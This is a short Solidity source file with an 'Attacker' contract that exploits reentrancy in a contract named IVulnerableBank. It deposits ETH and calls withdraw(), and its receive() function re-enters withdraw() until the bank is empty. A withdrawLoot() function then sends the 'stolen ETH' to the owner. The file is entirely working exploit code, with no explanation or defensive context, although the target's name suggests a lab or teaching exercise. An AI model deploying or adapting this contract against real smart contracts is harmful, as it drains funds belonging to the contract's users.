// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerableBank public bank;
    address public owner;

    constructor(address _bank) {
        bank = IVulnerableBank(_bank);
        owner = msg.sender;
    }

    // 🔥 Deposit + immediately start attack
    function attack() external payable {
        require(msg.value > 0, "Send ETH");

        // Deposit ETH into bank
        bank.deposit{value: msg.value}();

        // Trigger reentrancy
        bank.withdraw();
    }

    // Re-enter withdraw()
    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdraw();
        }
    }

    // Withdraw stolen ETH
    function withdrawLoot() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
